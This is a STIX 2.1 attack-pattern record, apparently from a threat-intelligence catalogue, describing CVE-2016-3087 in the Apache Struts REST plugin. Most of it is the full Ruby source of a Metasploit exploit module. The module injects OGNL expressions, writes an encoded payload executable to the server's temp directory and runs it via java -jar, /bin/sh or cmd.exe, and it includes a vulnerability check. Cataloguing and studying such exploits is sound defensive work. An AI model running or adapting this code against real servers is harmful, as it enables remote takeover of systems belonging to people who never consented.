{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b2d42459-4ab3-4fe7-890e-4f3101cb7f86",
    "created": "2024-08-14T17:10:11.416027Z",
    "modified": "2024-08-14T17:10:11.41603Z",
    "name": "Apache Struts REST Plugin With Dynamic Method Invocation Remote Code Execution",
    "description": " This module exploits a remote command execution vulnerability in Apache Struts version between 2.3.20 and 2.3.28 (except 2.3.20.2 and 2.3.24.2). Remote Code Execution can be performed when using REST Plugin with ! operator when Dynamic Method Invocation is enabled. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/struts_dmi_rest_exec.rb",
            "external_id": "struts_dmi_rest_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-3087"
        },
        {
            "source_name": "reference",
            "url": "https://www.seebug.org/vuldb/ssvid-91741"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Apache Struts REST Plugin With Dynamic Method Invocation Remote Code Execution',\n      'Description'    => %q{\n        This module exploits a remote command execution vulnerability in Apache Struts\n        version between 2.3.20 and 2.3.28 (except 2.3.20.2 and 2.3.24.2). Remote Code\n        Execution can be performed when using REST Plugin with ! operator when\n        Dynamic Method Invocation is enabled.\n      },\n      'Author'         => [\n        'Nixawk' # original metasploit module\n       ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2016-3087' ],\n          [ 'URL', 'https://www.seebug.org/vuldb/ssvid-91741' ]\n        ],\n      'Platform'      => %w{ java linux win },\n      'Privileged'     => true,\n      'Targets'        =>\n        [\n          ['Windows Universal',\n            {\n              'Arch' => ARCH_X86,\n              'Platform' => 'win'\n            }\n          ],\n          ['Linux Universal',\n            {\n              'Arch' => ARCH_X86,\n              'Platform' => 'linux'\n            }\n          ],\n          [ 'Java Universal',\n            {\n              'Arch' => ARCH_JAVA,\n              'Platform' => 'java'\n            },\n          ]\n        ],\n      'DisclosureDate' => '2016-06-01',\n      'DefaultTarget' => 2))\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptString.new('TARGETURI', [ true, 'The path to a struts application action', '/struts2-rest-showcase/orders/3/']),\n        OptString.new('TMPPATH', [ false, 'Overwrite the temp path for the file upload. Needed if the home directory is not writable.', nil])\n      ])\n  end\n\n  def print_status(msg='')\n    super(\"#{peer} - #{msg}\")\n  end\n\n  def get_target_platform\n    target.platform.platforms.first\n  end\n\n  def temp_path\n    @TMPPATH ||= lambda {\n      path = datastore['TMPPATH']\n      return nil unless path\n\n      case get_target_platform\n      when Msf::Module::Platform::Windows\n        slash = '\\\\'\n      when\n        slash = '/'\n      else\n      end\n\n      unless path.end_with?('/')\n        path << '/'\n      end\n      return path\n    }.call\n  end\n\n  def send_http_request(payload, params_hash)\n    uri = normalize_uri(datastore['TARGETURI'])\n    uri = \"#{uri}/#{payload}\"\n    resp = send_request_cgi(\n      'uri'     => uri,\n      'version' => '1.1',\n      'method'  => 'POST',\n      'vars_post' => params_hash\n    )\n    if resp && resp.code == 404\n      fail_with(Failure::BadConfig, 'Server returned HTTP 404, please double check TARGETURI')\n    end\n    resp\n  end\n\n  def generate_rce_payload(code)\n    payload = \"\"\n    payload << Rex::Text.uri_encode(\"#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS\")\n    payload << \",\"\n    payload << Rex::Text.uri_encode(code)\n    payload << \",\"\n    payload << Rex::Text.uri_encode(\"#xx.toString.json\")\n    payload << \"?\"\n    payload << Rex::Text.uri_encode(\"#xx:#request.toString\")\n    payload\n  end\n\n  def upload_exec(cmd, filename, content)\n    var_a = rand_text_alpha_lower(4)\n    var_b = rand_text_alpha_lower(4)\n    var_c = rand_text_alpha_lower(4)\n    var_d = rand_text_alpha_lower(4)\n    var_e = rand_text_alpha_lower(4)\n    var_f = rand_text_alpha_lower(4)\n\n    code =  \"##{var_a}=new sun.misc.BASE64Decoder(),\"\n    code << \"##{var_b}=new java.io.FileOutputStream(new java.lang.String(##{var_a}.decodeBuffer(#parameters.#{var_e}[0]))),\"\n    code << \"##{var_b}.write(new java.math.BigInteger(#parameters.#{var_f}[0], 16).toByteArray()),##{var_b}.close(),\"\n    code << \"##{var_c}=new java.io.File(new java.lang.String(##{var_a}.decodeBuffer(#parameters.#{var_e}[0]))),##{var_c}.setExecutable(true),\"\n    code << \"@java.lang.Runtime@getRuntime().exec(new java.lang.String(##{var_a}.decodeBuffer(#parameters.#{var_d}[0])))\"\n    payload = generate_rce_payload(code)\n\n    params_hash = {\n      var_d => Rex::Text.encode_base64(cmd),\n      var_e => Rex::Text.encode_base64(filename),\n      var_f => content\n    }\n    send_http_request(payload, params_hash)\n  end\n\n  def check\n    var_a = rand_text_alpha_lower(4)\n    var_b = rand_text_alpha_lower(4)\n\n    addend_one = rand_text_numeric(rand(3) + 1).to_i\n    addend_two = rand_text_numeric(rand(3) + 1).to_i\n    sum = addend_one + addend_two\n    flag = Rex::Text.rand_text_alpha(5)\n\n    code = \"##{var_a}=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),\"\n    code << \"##{var_a}.print(#parameters.#{var_b}[0]),\"\n    code << \"##{var_a}.print(new java.lang.Integer(#{addend_one}+#{addend_two})),\"\n    code << \"##{var_a}.print(#parameters.#{var_b}[0]),\"\n    code << \"##{var_a}.close()\"\n\n    payload = generate_rce_payload(code)\n    params_hash = { var_b => flag }\n\n    begin\n      resp = send_http_request(payload, params_hash)\n    rescue Msf::Exploit::Failed\n      return Exploit::CheckCode::Unknown\n    end\n\n    if resp && resp.code == 200 && resp.body.include?(\"#{flag}#{sum}#{flag}\")\n      Exploit::CheckCode::Vulnerable\n    else\n      Exploit::CheckCode::Safe\n    end\n  end\n\n  def exploit\n    payload_exe = rand_text_alphanumeric(4 + rand(4))\n    case target['Platform']\n      when 'java'\n        payload_exe = \"#{temp_path}#{payload_exe}.jar\"\n        pl_exe = payload.encoded_jar.pack\n        command = \"java -jar #{payload_exe}\"\n      when 'linux'\n        path = datastore['TMPPATH'] || '/tmp/'\n        pl_exe = generate_payload_exe\n        payload_exe = \"#{path}#{payload_exe}\"\n        command = \"/bin/sh -c #{payload_exe}\"\n      when 'win'\n        path = temp_path || '.\\\\'\n        pl_exe = generate_payload_exe\n        payload_exe = \"#{path}#{payload_exe}.exe\"\n        command = \"cmd.exe /c #{payload_exe}\"\n      else\n        fail_with(Failure::NoTarget, 'Unsupported target platform!')\n    end\n\n    pl_content = pl_exe.unpack('H*').join()\n\n    print_status(\"Uploading exploit to #{payload_exe}, and executing it.\")\n    upload_exec(command, payload_exe, pl_content)\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-06-01",
    "x_mitre_platforms": [
        "java"
    ]
}